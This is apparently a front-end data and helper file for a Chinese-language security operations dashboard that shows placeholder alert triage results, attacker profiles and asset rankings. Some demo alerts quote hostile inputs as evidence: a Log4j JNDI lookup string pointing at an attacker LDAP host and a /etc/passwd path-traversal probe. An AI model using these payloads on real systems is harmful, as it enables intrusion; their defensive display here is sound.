/* ============================================================
   CFW 安全运营中心 —— 占位示例数据 + 公共方法
   ------------------------------------------------------------
   ⚠️ 下方 DEMO_DATA 全部为「示例占位数据」，仅用于演示界面。
   接入真实数据时，把每个字段替换为后端接口返回值即可，对应关系：

     windows[d].kpi / results / tokens   ← GET /api/overview?days=d
     windows[d].trend                    ← GET /api/trend?days=d
     health                              ← GET /api/health?days=d
     attackerRank                        ← GET /api/attacker_rank
     assetRank                           ← GET /api/asset_rank
     attention                           ← GET /api/realtime
     alerts                              ← GET /api/alerts
     profiles                            ← GET /api/profiles
     funnel / pipeline                   ← 由 triage_stats 汇总派生

   （接口定义见仓库 console.py / triage_stats.py）
   ============================================================ */

window.CFW = window.CFW || {};

// Chart.js 全局：关闭入场动画，确保任意时刻截图都已绘制
if (window.Chart) { Chart.defaults.animation = false; Chart.defaults.font.family = "JetBrains Mono"; }

CFW.DEMO = {
  // —— 三个时间窗的头部指标与趋势 ——
  windows: {
    1: {
      label: "今天",
      kpi: { total: 3847, auto: 3817, ignoreRate: 99.2, manual: 28, success: 2 },
      deltas: { total: "+6.4%", auto: "+5.9%", manual: "-12%", success: "+2" },
      results: { "扫描探测": 2140, "未见成功证据": 980, "确认未成功": 697, "需人工复核": 28, "确认成功": 2 },
      tokens: { input: 2960000, output: 410000, reasoning: 880000, total: 4250000 },
      trend: {
        days: ["06-16","06-17","06-18","06-19","06-20","06-21","06-22"],
        total: [3410, 3980, 3620, 4120, 3705, 3990, 3847],
        manual: [22, 31, 25, 40, 27, 33, 28],
        tokens: [3.7, 4.2, 3.9, 4.6, 4.0, 4.3, 4.25]
      }
    },
    3: {
      label: "近 3 天",
      kpi: { total: 11542, auto: 11455, ignoreRate: 99.25, manual: 82, success: 5 },
      deltas: { total: "+4.1%", auto: "+4.0%", manual: "-8%", success: "+3" },
      results: { "扫描探测": 6420, "未见成功证据": 2940, "确认未成功": 2095, "需人工复核": 82, "确认成功": 5 },
      tokens: { input: 8880000, output: 1230000, reasoning: 2640000, total: 12750000 },
      trend: {
        days: ["06-20","06-21","06-22"],
        total: [3705, 3990, 3847],
        manual: [27, 33, 28],
        tokens: [4.0, 4.3, 4.25]
      }
    },
    7: {
      label: "近 7 天",
      kpi: { total: 26899, auto: 26694, ignoreRate: 99.24, manual: 196, success: 9 },
      deltas: { total: "+3.2%", auto: "+3.1%", manual: "-15%", success: "+4" },
      results: { "扫描探测": 14980, "未见成功证据": 6860, "确认未成功": 4854, "需人工复核": 196, "确认成功": 9 },
      tokens: { input: 20700000, output: 2870000, reasoning: 6160000, total: 29730000 },
      trend: {
        days: ["06-16","06-17","06-18","06-19","06-20","06-21","06-22"],
        total: [3410, 3980, 3620, 4120, 3705, 3990, 3847],
        manual: [22, 31, 25, 40, 27, 33, 28],
        tokens: [3.7, 4.2, 3.9, 4.6, 4.0, 4.3, 4.25]
      }
    }
  },

  // —— 系统健康 —— ← /api/health
  health: {
    evidenceHit: 64, degradedRate: 7, disposeIgnored: 3817, disposeFailed: 0,
    llmErrors: 3, agentCount: 14, retryQueue: 2,
    errorsByType: { "WinError 10060": 2, "WinError 10061": 1 }
  },

  // —— 三层漏斗 + 流水线 ——（由 triage_stats 派生）
  funnel: [
    { key: "raw",   label: "原始流量 / 检测事件", n: 12418, note: "实时轮询告警中心,小时任务仅采集日志", tone: "primary" },
    { key: "noise", label: "排除扫描噪声", n: 3847, note: "剔除腾讯云暴露面扫描 21 IP + 公司漏扫 1 IP", tone: "primary", drop: "入库告警" },
    { key: "l0",    label: "第 0 层 · 确定性定性", n: 1920, note: "白名单扫描源 / 云端确认 / 高危直定，0 token", tone: "ok" },
    { key: "l1",    label: "第 1 层 · 规则过筛", n: 1402, note: "源包完整且响应全 4xx 失败 / 纯扫描器特征", tone: "ok" },
    { key: "l2",    label: "第 2 层 · 源包深度复核", n: 497, note: "主动拉取源数据包，基于真实 HTTP 包给结论", tone: "warn" },
    { key: "l3",    label: "第 3 层 · Agent 工具循环", n: 28, note: "高危/需人工，模型自主取证(只读)多轮研判", tone: "danger" },
    { key: "keep",  label: "保留人工复核", n: 30, note: "28 需人工 + 2 确认成功", tone: "danger" }
  ],

  pipeline: [
    { t: "实时轮询", d: "默认每 60 秒拉取告警中心新事件", icon: "collect" },
    { t: "排除噪声", d: "剔除腾讯云扫描 IP 与公司漏扫 IP", icon: "filter" },
    { t: "三层漏斗研判", d: "确定性 → 规则过筛 → 源包深度 → Agent 循环", icon: "funnel" },
    { t: "自动处置", d: "扫描/确认失败/未见成功证据 → 自动忽略加白", icon: "auto" },
    { t: "企微通知", d: "需人工 / 确认成功推卡片 + @所有人", icon: "notify" },
    { t: "17:50 日报", d: "唯一告警、攻击源、等级与研判分布汇总", icon: "report" }
  ],

  pipelineStatus: {
    config: { realtime_enabled: false, interval_seconds: 60, lookback_minutes: 10, auto_dispose: true, push_manual: true, daily_report_time: "17:50" },
    last_round: {},
    active_round: {},
    recent_rounds: [],
    totals: {},
    state: {},
    latest_wecom: {}
  },

  whitelistConfig: {
    tencent_scan_ips: [],
    company_scan_ips: [],
    whitelist_ips: [],
    counts: { tencent_scan_ips: 0, company_scan_ips: 0, total: 0 }
  },

  // —— 攻击来源 TOP —— ← /api/attacker_rank
  attackerRank: [
    { ip: "10.12.7.34",       pub: false, techniques: 4, count: 22, high: 7 },
    { ip: "45.143.166.21",    pub: true,  techniques: 6, count: 318, high: 4, country: "荷兰" },
    { ip: "193.56.29.110",    pub: true,  techniques: 2, count: 1240, high: 0, country: "俄罗斯" },
    { ip: "172.16.4.9",       pub: false, techniques: 3, count: 41, high: 3 },
    { ip: "61.177.172.88",    pub: true,  techniques: 3, count: 206, high: 1, country: "中国" },
    { ip: "104.234.115.7",    pub: true,  techniques: 4, count: 167, high: 2, country: "美国" }
  ],

  // —— 被攻击资产 TOP —— ← /api/asset_rank
  assetRank: [
    { dst: "web-api-prod-03 (10.0.2.13)", count: 612, attackers: 38, high: 6 },
    { dst: "gateway-edge (公网 VIP)",      count: 1180, attackers: 142, high: 4 },
    { dst: "10.12.7.50",                   count: 88, attackers: 3, high: 7 },
    { dst: "oa-portal (10.0.5.21)",        count: 240, attackers: 22, high: 1 },
    { dst: "db-mysql-01 (10.0.3.9)",       count: 36, attackers: 5, high: 2 }
  ],

  // —— 需重点关注(实时) —— ← /api/realtime
  attention: [
    { time: "2026-06-22 14:21", level: "高危", event: "内网横向 · 命令执行尝试", src: "10.12.7.34", dst: "10.12.7.50", pub: false, result: "确认成功" },
    { time: "2026-06-22 13:48", level: "高危", event: "Log4j JNDI 注入利用", src: "45.143.166.21", dst: "web-api-prod-03", pub: true, result: "需人工复核" },
    { time: "2026-06-22 12:55", level: "高危", event: "异常外联 · 疑似 C2 心跳", src: "172.16.4.9", dst: "193.56.29.110", pub: false, result: "需人工复核" },
    { time: "2026-06-22 11:30", level: "中危", event: "Struts2 OGNL 注入", src: "104.234.115.7", dst: "gateway-edge", pub: true, result: "需人工复核" },
    { time: "2026-06-22 10:12", level: "高危", event: "WebShell 上传尝试", src: "45.143.166.21", dst: "oa-portal", pub: true, result: "确认成功" }
  ],

  // —— 告警研判明细 —— ← /api/alerts
  alerts: [
    { time:"2026-06-22 14:21", level:"高危", event:"内网横向 · 命令执行尝试", atkIp:"10.12.7.34", dstIp:"10.12.7.50", result:"确认成功", source:"Agent", evidenceFrom:"netflow_nta", conf:"高", token:8420,
      why:"源包解码出 /bin/bash 反弹回显，目标返回 uid=0 命令结果，构成真实命令执行。", key:"resp body: uid=0(root) gid=0(root)", trace:"pull_packets→decode_hex→get_related_alerts(3轮)" },
    { time:"2026-06-22 13:48", level:"高危", event:"Log4j JNDI 注入利用", atkIp:"45.143.166.21", dstIp:"web-api-prod-03", result:"需人工复核", source:"源包复核", evidenceFrom:"rule_threatinfo", conf:"中", token:3120,
      why:"请求头含 ${jndi:ldap://...} 利用特征，云端判失败，源包未见外连回显，无法确认是否得手。", key:"User-Agent: ${jndi:ldap://45.143.166.21:1389/a}", trace:"" },
    { time:"2026-06-22 13:30", level:"中危", event:"目录遍历探测", atkIp:"193.56.29.110", dstIp:"gateway-edge", result:"扫描探测", source:"单轮", evidenceFrom:"聚合字段", conf:"高", token:640,
      why:"典型扫描器特征，连续请求 /../../etc/passwd 等路径，响应全 404，无利用。", key:"", trace:"" },
    { time:"2026-06-22 12:55", level:"高危", event:"异常外联 · 疑似 C2 心跳", atkIp:"172.16.4.9", dstIp:"193.56.29.110", result:"需人工复核", source:"Agent", evidenceFrom:"netflow_nta", conf:"中", token:6980,
      why:"内网主机周期性向境外 IP 发起固定长度心跳包，疑似 C2，TLS 密文无法解码内容，保留人工。", key:"周期 60s 等长上行包，目标境外", trace:"pull_packets→decode_hex(2轮)" },
    { time:"2026-06-22 11:30", level:"中危", event:"Struts2 OGNL 注入", atkIp:"104.234.115.7", dstIp:"gateway-edge", result:"未见成功证据", source:"源包复核", evidenceFrom:"rule_threatinfo", conf:"中", token:2740,
      why:"命中 S2-045 利用特征，源包响应为默认错误页，无命令回显或文件落地证据。", key:"Content-Type: %{...OGNL...}", trace:"" },
    { time:"2026-06-22 10:12", level:"高危", event:"WebShell 上传尝试", atkIp:"45.143.166.21", dstIp:"oa-portal", result:"确认成功", source:"Agent", evidenceFrom:"netflow_nta", conf:"高", token:9210,
      why:"上传 .jsp 后访问返回 webshell 交互页面，源包确认落地，构成 WebShell 行为。", key:"GET /upload/x.jsp → 200, body 含 cmd 执行表单", trace:"pull_packets→decode_hex→get_related_alerts(4轮)" },
    { time:"2026-06-22 09:40", level:"低危", event:"端口指纹扫描", atkIp:"193.56.29.110", dstIp:"gateway-edge", result:"扫描探测", source:"单轮", evidenceFrom:"聚合字段", conf:"高", token:520,
      why:"大规模端口与指纹扫描，纯扫描器特征，自动忽略。", key:"", trace:"" },
    { time:"2026-06-22 08:15", level:"中危", event:"SQL 注入探测", atkIp:"61.177.172.88", dstIp:"web-api-prod-03", result:"确认未成功", source:"源包复核", evidenceFrom:"rule_threatinfo", conf:"高", token:1980,
      why:"源包响应为 WAF 拦截页 403，注入未到达后端，确认未成功。", key:"resp: 403 WAF blocked", trace:"" }
  ],

  // —— 攻击者画像 —— ← /api/profiles
  profiles: [
    { ip:"10.12.7.34", internal:true, band:"高危", score:84, type:"内网横向", intent:"扩大据点 / 提权",
      stage:"横向扩散", killchainMax:"横向扩散",
      narrative:"先对 3 台内网主机做 SMB / WMI 探测，随后尝试 Pass-the-Hash 横向，在 10.12.7.50 触发命令执行并取得 root 回显——已得手，正向纵深扩散。",
      events:{"SMB探测":12,"WMI执行":5,"Pass-the-Hash":3,"命令执行":2},
      alertCount:22, techniques:4, targets:3, span:6, high:7, success:1, country:"内网",
      first:"2026-06-22 08:40", last:"2026-06-22 14:21",
      rec:"立即隔离 10.12.7.34 与 10.12.7.50，重置相关凭据，排查 PtH 来源主机。" },
    { ip:"45.143.166.21", internal:false, band:"高危", score:76, type:"漏洞利用", intent:"Web 资产突破",
      stage:"落地驻留", killchainMax:"落地驻留",
      narrative:"持续扫描 Web 暴露面后锁定目标，先后投递 Log4j JNDI 与 WebShell，oa-portal 上 WebShell 落地成功，对 web-api 的 Log4j 利用未见回显。",
      events:{"Web扫描":140,"Log4j利用":42,"WebShell上传":11,"目录遍历":18},
      alertCount:318, techniques:6, targets:4, span:9, high:4, success:1, country:"荷兰",
      first:"2026-06-22 06:10", last:"2026-06-22 14:48",
      rec:"封禁来源 IP，下线 oa-portal WebShell，全量排查 Log4j 组件版本。" },
    { ip:"172.16.4.9", internal:true, band:"关注", score:69, type:"异常外联", intent:"疑似 C2 回连",
      stage:"控制回连", killchainMax:"控制回连",
      narrative:"内网主机周期性向境外固定 IP 发起等长心跳，疑似已被植入 Beacon，但 TLS 密文无法解码，尚无落地证据。",
      events:{"异常外联":41,"DNS异常":8,"等长心跳":33},
      alertCount:41, techniques:3, targets:1, span:11, high:3, success:0, country:"内网",
      first:"2026-06-22 03:20", last:"2026-06-22 14:30",
      rec:"抓取该主机全量外连，比对威胁情报，必要时断网取证。" },
    { ip:"193.56.29.110", internal:false, band:"一般", score:38, type:"扫描器", intent:"无差别测绘",
      stage:"探测", killchainMax:"探测",
      narrative:"大规模端口与指纹扫描，覆盖多个资产，响应全部 4xx，典型无差别扫描器，无后续利用动作。",
      events:{"端口扫描":820,"指纹识别":320,"目录探测":100},
      alertCount:1240, techniques:2, targets:18, span:24, high:0, success:0, country:"俄罗斯",
      first:"2026-06-21 22:00", last:"2026-06-22 13:30",
      rec:"已自动忽略并加白处置，无需人工跟进，保留来源用于情报聚合。" }
  ],

  // —— 实时告警流 ticker 取样池 ——
  tickerPool: [
    { level:"低危", event:"端口指纹扫描", src:"193.56.29.110", res:"扫描探测" },
    { level:"中危", event:"SQL 注入探测", src:"61.177.172.88", res:"确认未成功" },
    { level:"低危", event:"目录遍历探测", src:"104.234.115.7", res:"扫描探测" },
    { level:"中危", event:"Struts2 OGNL 注入", src:"45.143.166.21", res:"未见成功证据" },
    { level:"低危", event:"弱口令爆破", src:"222.186.30.12", res:"确认未成功" },
    { level:"中危", event:"Fastjson 反序列化", src:"104.234.115.7", res:"未见成功证据" },
    { level:"高危", event:"内网 SMB 探测", src:"10.12.7.34", res:"需人工复核" },
    { level:"低危", event:"HTTP 方法探测", src:"193.56.29.110", res:"扫描探测" },
    { level:"中危", event:"XXE 实体注入", src:"45.143.166.21", res:"未见成功证据" },
    { level:"低危", event:"敏感路径访问", src:"61.177.172.88", res:"扫描探测" }
  ]
};

/* ============================================================
   公共方法
   ============================================================ */
CFW.state = { days: 1, view: "overview" };
CFW.win = () => CFW.DEMO.windows[CFW.state.days];

CFW.$ = (s, r = document) => r.querySelector(s);
CFW.$$ = (s, r = document) => [...r.querySelectorAll(s)];
CFW.esc = (s) => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
CFW.fmt = (n) => (n || 0).toLocaleString("en-US");
CFW.el = (tag, cls, html) => { const e = document.createElement(tag); if (cls) e.className = cls; if (html != null) e.innerHTML = html; return e; };

// 数字滚动动画（即时落定，避免截图捕捉到中间帧）
CFW.countUp = (node, target, dur = 900, fmt = CFW.fmt) => {
  const start = performance.now();
  const from = 0;
  node.textContent = fmt(target); // 先落定终值，截图任何时刻都正确
  function step(now) {
    const p = Math.min(1, (now - start) / dur);
    const e = 1 - Math.pow(1 - p, 3); // easeOutCubic
    node.textContent = fmt(Math.round(from + (target - from) * e));
    if (p < 1) requestAnimationFrame(step);
    else node.textContent = fmt(target);
  }
  requestAnimationFrame(step);
};

// 迷你 sparkline (SVG polyline)
CFW.sparkline = (data, w = 78, h = 30, color = "var(--primary)") => {
  const values = (data || []).map(Number).filter(Number.isFinite);
  if (values.length < 2) return "";
  const min = Math.min(...values), max = Math.max(...values), rng = max - min || 1;
  const pts = values.map((v, i) => {
    const x = (i / (values.length - 1)) * w;
    const y = h - 3 - ((v - min) / rng) * (h - 6);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(" ");
  return `<svg class="spark" width="${w}" height="${h}" viewBox="0 0 ${w} ${h}" fill="none">
    <polyline points="${pts}" stroke="${color}" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" opacity=".9"/>
  </svg>`;
};

// Chart.js 通用网格配色
CFW.axis = (extra = {}) => Object.assign({
  ticks: { color: "#5e6d8c", font: { family: "JetBrains Mono", size: 10.5 } },
  grid: { color: "rgba(28,40,64,.7)", drawBorder: false }
}, extra);
